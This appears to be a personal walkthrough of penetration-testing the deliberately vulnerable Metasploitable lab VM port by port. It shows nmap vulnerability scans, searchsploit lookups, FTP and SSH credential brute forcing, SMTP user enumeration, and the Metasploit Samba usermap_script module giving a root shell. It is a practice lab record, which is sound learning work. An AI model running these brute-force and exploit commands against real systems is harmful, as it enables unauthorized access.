### download the machine from https://www.vulnhub.com/entry/metasploitable-1,28/  
then luanch using vmware credintials are msfadmin:msfadmin
ip a to get machine 

Notes :
----

make sure your system is upgraded           
sudo apt update && sudo apt upgrade                 
sudo apt isntall exploitdb 


scan the target using nmap 
--
Nmap -sV -Sc <machine ip>  get 12 open ports 21 -22-23-25-53-80-139-445-3306-5430-8009
 
  
now lets walkthough each port and see what we can do (sepratly and combined ):
----

PORT  ::  STATE  ::  SERVICE ::  VERSIO
  
21/tcp :: open :: ftp ::   ProFTPD 1.3.1  
  ----

perform the command "searchsploit ProFTPD 1.3.1 " to check if the service is vulnerable
  
Exploits: No Results

try "searchsploit ProFTPD 1.3. " 
  
found some intersting result like " ProFTPd IAC 1.3.x - Remote Command Execution | linux/remote/15449.pl"
  
run the command " searchsploit -m linux/remote/15449.pl "   to mirror the exploit which is  source code written in Perl 
  
nano 15449.pl
  
taking some time try to understand the code and verify that's not malicous
  ----
using the interpreter python to verfiy ech hexa variable 
  
i DECIDED TO Import this source code to metasploit As module if you don't know how 
watch this video for it >> https://www.youtube.com/watch?v=l7mwIvT5YNo

the result was'nt pleasent :::Metasploit is not detecting the scrpit  
  --
i've tried alot but doesn't work
  
searching for the issu found that this exploit does not written as metasploit module so 
  
msf would have no idea what to do with it
  
you can see this article  https://github.com/rapid7/metasploit-framework/issues/12825

so i decided to run the exploit as it is using perl interpreter 
  --
typeing perl 15549.pl <ip target> <my ip> target type

it appeared that this script does not have vuln for the exact ProFTPD 1.3.1  So it fails to exploit the service 

so i've moved to another approched " brute forcing the service for weak credintials " 
  --
using Nmap Engine 
nmap <tagetip> 21 --script =ftp-brute.nse

took 600s to find valid credintial of user:user 

checking to see if this ftp supports excuting command through " SITE EXEC command" 
it seems like it does not support that 

so far we got valid credintaial for ftp with no ablility to excute commands or existance of sensitve files
 perform another intensive scan for the ftp , found potential vuln
 
 CVE-2011-4130 CVSS 9.0
 ---
 
allows remote authenticated users to execute arbitrary code , let's give it a shot 
 unfortentally there are no proof of concept or working exploit availabe online also there is no metasploit module for it
 
 so let's move on
 
 
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
----
trying the same credintial of fttp for ssh it works :D 

  now we can excute files on the machine  
 
 get step back and use nmap scropt engine for inteinsive scanning for port22
 
 nmap -sV -sC 192.168.1.3 -p 22 --script vuln get some result 
 
 CVE-2011-1013 CVSS 7.2
---
 allows local users to cause a denial of service (system crash)

 CVE-2010-4478 CVSS 7.5
---
 which allows remote attackers to bypass the need for knowledge of the shared secret, and successfully authenticate
 
  unfortentally there are no proof of concept or working exploit availabe online also there are no metasploit module for them
 
 so i've moved to another approched " brute forcing the service for root credintials " using metaspolit
 ---
 msf > use auxiliary/scanner/ssh/ssh_login
 
msf auxiliary(ssh_login) > set RHOSTS 10.0.0.27
 
RHOSTS => 192.168.1.3
 
msf auxiliary(ssh_login) > set USERPASS_FILE /usr/share/metasploit-framework/data/wordlists/root_userpass.txt
 
USERPASS_FILE => /usr/share/metasploit-framework/data/wordlists/root_userpass.txt
 

 msf auxiliary(ssh_login) > run
 
 no promising results , so lets move forward 
 
23/tcp   open  telnet      Linux telnetd
---
 nmap

  nmap -sV -sC 192.168.1.3 -p 23 --script vuln get some result
 saerchsplit for telnet linux 
 coulden't verfy that the service is vulnerable 

 25/tcp   open  smtp        Postfix smtpd
 -----
 
 nmap -sV -sC 192.168.1.3 -p 23 --script vuln get some result
 the service is vurnalble to two mitm attacks (which i skiped) 
 enumerating the user using smpt-user-enum tool getting me this result 
 --
 
 192.168.1.3:25 Users found: , backup, bin, daemon, distccd, ftp, games, gnats, irc, libuuid, list, lp, mail, man, mysql, news, nobody, postfix, postgres, postmaster, proxy, service, sshd, sync, sys, syslog, user, uucp, www-data

bruteforcing the password using hydra but authentication not enabled on the server 
 
 53/tcp   open  domain      ISC BIND 9.4.2
----
 using nmap engine found CVE-2008-0122 CSSV 10.0 vulnebilitys that causes Denial Of ServiceExecute CodeMemory corruption

 
 There are not any metasploit modules related to this CVE or any working online exploit
 
 
 
 80/tcp   open  http        Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.10 with Suhosin-Patch)
---
 running nmap , searching edb and mfs couldn't verfy vulnerability for the exact version of the service
 
 139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
      445/tcp  open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
----
 saerching exploit database for Samba getting me MSF module that returns a root shell 
 > use exploit/multi/samba/usermap_script
> set RHOST 192.168.1.3
> exploit 

 $whoami 

 root 
 sudo/etc/shadow :D 
 
 3306/tcp open  mysql       MySQL 5.0.51a-3ubuntu5
 ---
 Could not find any vulnerabilities matching this version
 
 5432/tcp open  postgresql  PostgreSQL DB 8.3.0 - 8.3.7
---
 
searching the MSF i found a module for remote shell 
 
 
 
 
 
 
